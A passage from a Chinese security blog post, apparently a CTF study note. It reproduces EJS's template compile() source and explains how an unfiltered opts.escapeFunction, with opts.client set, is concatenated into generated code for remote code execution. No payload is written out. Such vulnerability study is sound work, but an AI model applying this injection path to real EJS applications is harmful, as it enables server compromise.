+</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">_JS_IDENTIFIER</span>.<span style="color:#a6e22e">test</span>(<span style="color:#a6e22e">name</span>)) {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> Error(<span style="color:#e6db74">&#39;destructuredLocals[&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;] is not a valid JS identifier.&#39;</span>);
+</span></span><span style="display:flex;"><span>          }
+</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">i</span> <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">destructuring</span> <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;,\n  &#39;</span>;
+</span></span><span style="display:flex;"><span>          }
+</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">destructuring</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">name</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39; = __locals.&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">name</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">prepended</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">destructuring</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;;\n&#39;</span>;
+</span></span><span style="display:flex;"><span>      }
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">opts</span>.<span style="color:#a6e22e">_with</span> <span style="color:#f92672">!==</span> <span style="color:#66d9ef">false</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">prepended</span> <span style="color:#f92672">+=</span>  <span style="color:#e6db74">&#39;  with (&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">opts</span>.<span style="color:#a6e22e">localsName</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39; || {}) {&#39;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;\n&#39;</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">appended</span> <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;  }&#39;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;\n&#39;</span>;
+</span></span><span style="display:flex;"><span>      }
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">appended</span> <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;  return __output;&#39;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;\n&#39;</span>;
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">source</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">prepended</span> <span style="color:#f92672">+</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">source</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">appended</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">opts</span>.<span style="color:#a6e22e">compileDebug</span>) {
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">src</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;var __line = 1&#39;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;\n&#39;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;  , __lines = &#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">JSON</span>.<span style="color:#a6e22e">stringify</span>(<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">templateText</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;\n&#39;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;  , __filename = &#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">sanitizedFilename</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;;&#39;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;\n&#39;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;try {&#39;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;\n&#39;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">+</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">source</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;} catch (e) {&#39;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;\n&#39;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;  rethrow(e, __lines, __filename, __line, escapeFn);&#39;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;\n&#39;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;}&#39;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;\n&#39;</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">src</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">source</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">opts</span>.<span style="color:#a6e22e">client</span>) {
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">src</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;escapeFn = escapeFn || &#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">escapeFn</span>.<span style="color:#a6e22e">toString</span>() <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;;&#39;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;\n&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">src</span>;
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">opts</span>.<span style="color:#a6e22e">compileDebug</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">src</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;rethrow = rethrow || &#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">rethrow</span>.<span style="color:#a6e22e">toString</span>() <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;;&#39;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;\n&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">src</span>;
+</span></span><span style="display:flex;"><span>      }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">opts</span>.<span style="color:#a6e22e">strict</span>) {
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">src</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#34;use strict&#34;;\n&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">src</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">opts</span>.<span style="color:#a6e22e">debug</span>) {
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">src</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">opts</span>.<span style="color:#a6e22e">compileDebug</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">opts</span>.<span style="color:#a6e22e">filename</span>) {
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">src</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">src</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;\n&#39;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;//# sourceURL=&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">sanitizedFilename</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;\n&#39;</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span> {
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">opts</span>.<span style="color:#66d9ef">async</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// Have to use generated function for this, since in envs without support,
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#75715e">// it breaks in parsing
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#66d9ef">try</span> {
+</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">ctor</span> <span style="color:#f92672">=</span> (<span style="color:#66d9ef">new</span> Function(<span style="color:#e6db74">&#39;return (async function(){}).constructor;&#39;</span>))();
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">catch</span>(<span style="color:#a6e22e">e</span>) {
+</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">e</span> <span style="color:#66d9ef">instanceof</span> <span style="color:#a6e22e">SyntaxError</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> Error(<span style="color:#e6db74">&#39;This environment does not support async/await&#39;</span>);
+</span></span><span style="display:flex;"><span>          }
+</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">throw</span> <span style="color:#a6e22e">e</span>;
+</span></span><span style="display:flex;"><span>          }
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>      }
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">ctor</span> <span style="color:#f92672">=</span> Function;
+</span></span><span style="display:flex;"><span>      }
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">fn</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">ctor</span>(<span style="color:#a6e22e">opts</span>.<span style="color:#a6e22e">localsName</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;, escapeFn, include, rethrow&#39;</span>, <span style="color:#a6e22e">src</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">catch</span>(<span style="color:#a6e22e">e</span>) {
+</span></span><span style="display:flex;"><span>      <span style="color:#75715e">// istanbul ignore else
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>      <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">e</span> <span style="color:#66d9ef">instanceof</span> <span style="color:#a6e22e">SyntaxError</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">opts</span>.<span style="color:#a6e22e">filename</span>) {
+</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">e</span>.<span style="color:#a6e22e">message</span> <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39; in &#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">opts</span>.<span style="color:#a6e22e">filename</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">e</span>.<span style="color:#a6e22e">message</span> <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39; while compiling ejs\n\n&#39;</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">e</span>.<span style="color:#a6e22e">message</span> <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;If the above error is not helpful, you may want to try EJS-Lint:\n&#39;</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">e</span>.<span style="color:#a6e22e">message</span> <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;https://github.com/RyanZim/EJS-Lint&#39;</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">opts</span>.<span style="color:#66d9ef">async</span>) {
+</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">e</span>.<span style="color:#a6e22e">message</span> <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;\n&#39;</span>;
+</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">e</span>.<span style="color:#a6e22e">message</span> <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;Or, if you meant to create an async function, pass `async: true` as an option.&#39;</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>      }
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">throw</span> <span style="color:#a6e22e">e</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Return a callable function which will execute the function
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">// created by the source-code, with the passed data as locals
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">// Adds a local `include` function which allows full recursive include
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">returnedFn</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">opts</span>.<span style="color:#a6e22e">client</span> <span style="color:#f92672">?</span> <span style="color:#a6e22e">fn</span> <span style="color:#f92672">:</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">anonymous</span>(<span style="color:#a6e22e">data</span>) {
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">include</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span> (<span style="color:#a6e22e">path</span>, <span style="color:#a6e22e">includeData</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">d</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">utils</span>.<span style="color:#a6e22e">shallowCopy</span>(<span style="color:#a6e22e">utils</span>.<span style="color:#a6e22e">createNullProtoObjWherePossible</span>(), <span style="color:#a6e22e">data</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">includeData</span>) {
+</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">d</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">utils</span>.<span style="color:#a6e22e">shallowCopy</span>(<span style="color:#a6e22e">d</span>, <span style="color:#a6e22e">includeData</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">includeFile</span>(<span style="color:#a6e22e">path</span>, <span style="color:#a6e22e">opts</span>)(<span style="color:#a6e22e">d</span>);
+</span></span><span style="display:flex;"><span>      };
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">fn</span>.<span style="color:#a6e22e">apply</span>(<span style="color:#a6e22e">opts</span>.<span style="color:#a6e22e">context</span>,
+</span></span><span style="display:flex;"><span>        [<span style="color:#a6e22e">data</span> <span style="color:#f92672">||</span> <span style="color:#a6e22e">utils</span>.<span style="color:#a6e22e">createNullProtoObjWherePossible</span>(), <span style="color:#a6e22e">escapeFn</span>, <span style="color:#a6e22e">include</span>, <span style="color:#a6e22e">rethrow</span>]);
+</span></span><span style="display:flex;"><span>    };
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">opts</span>.<span style="color:#a6e22e">filename</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#66d9ef">typeof</span> Object.<span style="color:#a6e22e">defineProperty</span> <span style="color:#f92672">===</span> <span style="color:#e6db74">&#39;function&#39;</span>) {
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">filename</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">opts</span>.<span style="color:#a6e22e">filename</span>;
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">basename</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">path</span>.<span style="color:#a6e22e">basename</span>(<span style="color:#a6e22e">filename</span>, <span style="color:#a6e22e">path</span>.<span style="color:#a6e22e">extname</span>(<span style="color:#a6e22e">filename</span>));
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">try</span> {
+</span></span><span style="display:flex;"><span>        Object.<span style="color:#a6e22e">defineProperty</span>(<span style="color:#a6e22e">returnedFn</span>, <span style="color:#e6db74">&#39;name&#39;</span>, {
+</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">value</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">basename</span>,
+</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">writable</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">false</span>,
+</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">enumerable</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">false</span>,
+</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">configurable</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">true</span>
+</span></span><span style="display:flex;"><span>        });
+</span></span><span style="display:flex;"><span>      } <span style="color:#66d9ef">catch</span> (<span style="color:#a6e22e">e</span>) {<span style="color:#75715e">/* ignore */</span>}
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">returnedFn</span>;
+</span></span><span style="display:flex;"><span>  },
+</span></span></code></pre></div><p><img src="https://gkjzjh146.github.io/ejs%E5%A4%A7%E6%9D%82%E7%83%A9.assets/image-20230822125402924.png" alt="image-20230822125402924"></p>
+<p><code>opts.outputFunctionName</code> 、<code>opts.localsName</code> 、<code>opts.destructuredLocals</code> 想要拼接进 <code>src</code> 的话要通过 正则的 白名单处理</p>
+<p>但是，还是有元素没有被正则过滤，这就是 <code>opts.escapeFunction</code></p>
+<p><img src="https://gkjzjh146.github.io/ejs%E5%A4%A7%E6%9D%82%E7%83%A9.assets/image-20230822125846882.png" alt="image-20230822125846882"></p>
+<p>也就是说，当 <code>opts.client</code> 不为空的情况下，<code>opts.escapeFunction</code> 的值就能直接拼接到 <code>src</code> 当中，从而实现任意代码执行。</p>
+<p>src的值</p>
+<p><img src="https://gkjzjh146.github.io/ejs%E5%A4%A7%E6%9D%82%E7%83%A9.assets/image-20230822130004847.png" alt="image-20230822130004847"></p>
+<p>命令执行<img src="https://gkjzjh146.github.io/ejs%E5%A4%A7%E6%9D%82%E7%83%A9.assets/image-20230822130018341.png" alt="image-20230822130018341"></p>
+<h1 id="总结">总结</h1>
+<p>nepctf上遇到的，顺便学习一下</p>
+<h1 id="参考">参考</h1>
+<p><a href="https://xz.aliyun.com/t/12323#toc-10">Ejs模板引擎注入实现RCE - 先知社区 (aliyun.com)</a></p>
+<p><a href="https://inhann.top/2023/03/26/ejs/">ejs RCE CVE-2022-29078 bypass - inHann的博客 | inHann&rsquo;s Blog</a></p>
+              
+
+
+            </div>
+          </div>
+          <div id="post-footer" class="post-footer main-content-wrap">
+            
+              
+                
+                
+                  <div class="post-footer-tags">
+                    <span class="text-color-light text-small">标签</span><br/>
+                    
+  <a class="tag tag--primary tag--small" href="https://gkjzjh146.github.io/tags/ejs/">ejs</a>
+
+  <a class="tag tag--primary tag--small" href="https://gkjzjh146.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a>
+
+                  </div>
+                
+              
+            
+            
+<div class="post-actions-wrap">
+  <nav >
+    <ul class="post-actions post-action-nav">
+      
+        <li class="post-action">
+          
+            <a class="post-action-btn btn btn--disabled">
+          
+              <i class="fa fa-angle-left"></i>
+              <span class="hide-xs hide-sm text-small icon-ml">下一篇</span>
+            </a>
+        </li>
+        <li class="post-action">
+          
+            <a class="post-action-btn btn btn--default tooltip--top" href="https://gkjzjh146.github.io/post/cc%E9%93%BE%E5%AE%A1%E8%AE%A1/" data-tooltip="cc链大杂烩" aria-label="上一篇: cc链大杂烩">
+          
+              <span class="hide-xs hide-sm text-small icon-mr">上一篇</span>
+              <i class="fa fa-angle-right"></i>
+            </a>
+        </li>
+      
+    </ul>
+  </nav>
+<ul class="post-actions post-action-share" >
+  
+    <li class="post-action hide-lg hide-md hide-sm">
+      <a class="post-action-btn btn btn--default btn-open-shareoptions" href="#btn-open-shareoptions" aria-label="分享这个帖子">
+        <i class="fa fa-share-alt" aria-hidden="true"></i>
+      </a>
+    </li>
+    
+      <li class="post-action hide-xs">
+        <a class="post-action-btn btn btn--default" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https://gkjzjh146.github.io/post/ejs%E5%A4%A7%E6%9D%82%E7%83%A9/" title="分享到 Facebook" aria-label="分享到 Facebook">
+          <i class="fab fa-facebook-square" aria-hidden="true"></i>
+        </a>
+      </li>
+    
+      <li class="post-action hide-xs">
+        <a class="post-action-btn btn btn--default" target="new" href="https://twitter.com/intent/tweet?text=https://gkjzjh146.github.io/post/ejs%E5%A4%A7%E6%9D%82%E7%83%A9/" title="分享到 Twitter" aria-label="分享到 Twitter">
+          <i class="fab fa-twitter" aria-hidden="true"></i>
+        </a>
+      </li>
+    
+      <li class="post-action hide-xs">
+        <a class="post-action-btn btn btn--default" target="new" href="https://www.linkedin.com/sharing/share-offsite/?url=https://gkjzjh146.github.io/post/ejs%E5%A4%A7%E6%9D%82%E7%83%A9/" title="分享到 Linkedin" aria-label="分享到 Linkedin">
+          <i class="fab fa-linkedin" aria-hidden="true"></i>
+        </a>
+      </li>
+    
+  
+  
+    <li class="post-action">
+      <a class="post-action-btn btn btn--default" href="#disqus_thread" aria-label="发表评论">
+        <i class="far fa-comment"></i>
+      </a>
+    </li>
+  
+  <li class="post-action">
+    
+      <a class="post-action-btn btn btn--default" href="#top" aria-label="回到顶部">
+      <i class="fa fa-arrow-up" aria-hidden="true"></i>
+    
+    </a>
+  </li>
+</ul>
+</div>
+
+
+            
+  
+    <div id="disqus_thread">
+      <noscript>Please enable JavaScript to view the comments powered by Disqus.</noscript>
+    </div>
+    <script type="text/javascript">
+      var disqus_config = function() {
+        this.page.url = 'https:\/\/gkjzjh146.github.io\/post\/ejs%E5%A4%A7%E6%9D%82%E7%83%A9\/';
+        
+          this.page.identifier = '\/post\/ejs%E5%A4%A7%E6%9D%82%E7%83%A9\/'
+        
+      };
+      (function() {
+        
+        
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+          document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+          return;
+        }
+        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+        var disqus_shortname = 'hugo-tranquilpeak-theme';
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+      })();
+    </script>
+  
+
+
+          </div>
+        </article>
+        <footer id="footer" class="main-content-wrap">
+  <span class="copyrights">
+    &copy; 2023 gkjzjh146. All Rights Reserved
+  </span>
+    <br>
+    
+    <div class="busuanzi-footer">
+  <span id="busuanzi_container_site_pv">
+    本站总访问量<span id="busuanzi_value_site_pv"></span>次
+  </span>
+        <span id="busuanzi_container_site_uv">
+    本站访客数<span id="busuanzi_value_site_uv"></span>人次
+  </span>
+    </div></footer>
+
+      </div>
+      <div id="bottom-bar" class="post-bottom-bar" data-behavior="4">
+        
+<div class="post-actions-wrap">
+  <nav >
+    <ul class="post-actions post-action-nav">
+      
+        <li class="post-action">
+          
+            <a class="post-action-btn btn btn--disabled">
+          
+              <i class="fa fa-angle-left"></i>
+              <span class="hide-xs hide-sm text-small icon-ml">下一篇</span>
+            </a>
+        </li>
+        <li class="post-action">
+          
+            <a class="post-action-btn btn btn--default tooltip--top" href="https://gkjzjh146.github.io/post/cc%E9%93%BE%E5%AE%A1%E8%AE%A1/" data-tooltip="cc链大杂烩" aria-label="上一篇: cc链大杂烩">
+          
+              <span class="hide-xs hide-sm text-small icon-mr">上一篇</span>
+              <i class="fa fa-angle-right"></i>
+            </a>
+        </li>
+      
+    </ul>
+  </nav>
+<ul class="post-actions post-action-share" >
+  
+    <li class="post-action hide-lg hide-md hide-sm">
+      <a class="post-action-btn btn btn--default btn-open-shareoptions" href="#btn-open-shareoptions" aria-label="分享这个帖子">
+        <i class="fa fa-share-alt" aria-hidden="true"></i>
+      </a>
+    </li>
+    
+      <li class="post-action hide-xs">
+        <a class="post-action-btn btn btn--default" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https://gkjzjh146.github.io/post/ejs%E5%A4%A7%E6%9D%82%E7%83%A9/" title="分享到 Facebook" aria-label="分享到 Facebook">
+          <i class="fab fa-facebook-square" aria-hidden="true"></i>
+        </a>
+      </li>
+    
+      <li class="post-action hide-xs">
+        <a class="post-action-btn btn btn--default" target="new" href="https://twitter.com/intent/tweet?text=https://gkjzjh146.github.io/post/ejs%E5%A4%A7%E6%9D%82%E7%83%A9/" title="分享到 Twitter" aria-label="分享到 Twitter">
+          <i class="fab fa-twitter" aria-hidden="true"></i>
+        </a>
+      </li>
+    
+      <li class="post-action hide-xs">
+        <a class="post-action-btn btn btn--default" target="new" href="https://www.linkedin.com/sharing/share-offsite/?url=https://gkjzjh146.github.io/post/ejs%E5%A4%A7%E6%9D%82%E7%83%A9/" title="分享到 Linkedin" aria-label="分享到 Linkedin">
+          <i class="fab fa-linkedin" aria-hidden="true"></i>
+        </a>
+      </li>
+    
+  
+  
+    <li class="post-action">
+      <a class="post-action-btn btn btn--default" href="#disqus_thread" aria-label="发表评论">
+        <i class="far fa-comment"></i>
+      </a>
+    </li>
+  
+  <li class="post-action">
+    
+      <a class="post-action-btn btn btn--default" href="#top" aria-label="回到顶部">
+      <i class="fa fa-arrow-up" aria-hidden="true"></i>
+    
+    </a>
+  </li>
+</ul>
+</div>
+
+
+      </div>
+      
+<div id="share-options-bar" class="share-options-bar" data-behavior="4">
+  <i id="btn-close-shareoptions" class="fa fa-times"></i>
+  <ul class="share-options">
+    
+      <li class="share-option">
+        <a class="share-option-btn" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fgkjzjh146.github.io%2Fpost%2Fejs%25E5%25A4%25A7%25E6%259D%2582%25E7%2583%25A9%2F" aria-label="分享到 Facebook">
+          <i class="fab fa-facebook-square" aria-hidden="true"></i><span>分享到 Facebook</span>
+        </a>
+      </li>
+    
+      <li class="share-option">
+        <a class="share-option-btn" target="new" href="https://twitter.com/intent/tweet?text=https%3A%2F%2Fgkjzjh146.github.io%2Fpost%2Fejs%25E5%25A4%25A7%25E6%259D%2582%25E7%2583%25A9%2F" aria-label="分享到 Twitter">
+          <i class="fab fa-twitter" aria-hidden="true"></i><span>分享到 Twitter</span>
+        </a>
+      </li>
+    
+      <li class="share-option">
+        <a class="share-option-btn" target="new" href="https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2Fgkjzjh146.github.io%2Fpost%2Fejs%25E5%25A4%25A7%25E6%259D%2582%25E7%2583%25A9%2F" aria-label="分享到 Linkedin">
+          <i class="fab fa-linkedin" aria-hidden="true"></i><span>分享到 Linkedin</span>
+        </a>
+      </li>
+    
+  </ul>
+</div>
+<div id="share-options-mask" class="share-options-mask"></div>
+
+
+    </div>
+    
+    <div id="about">
+  <div id="about-card">
+    <div id="about-btn-close">
+      <i class="fa fa-times"></i>
+    </div>
+    
+      <img id="about-card-picture" src="https://gkjzjh146.github.io/images/1.jpg" alt="作者的图片" />
+    
+    <h4 id="about-card-name">gkjzjh146</h4>
+    
+      <div id="about-card-bio">会点web，会点misc</div>
+    
+    
+    
+  </div>
+</div>
+
+    
+
+    
+  
+    
+      <div id="cover" style="background-image:url('https://gkjzjh146.github.io/images/3.jpeg');"></div>
+    
+  
+
+
+    
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" integrity="sha512-894YE6QWD5I59HgZOGReFYm4dnWc1Qt5NtvYSaNcOP+u1T9qYdvdihz0PPSiiqn/+/3e7Jo4EaG7TubfWGUrMQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/highlight.min.js" integrity="sha512-z+/WWfyD5tccCukM4VvONpEtLmbAm5LDu7eKiyMQJ9m7OfPEDL7gENyDRL3Yfe8XAuGsS2fS4xSMnl6d30kqGQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+
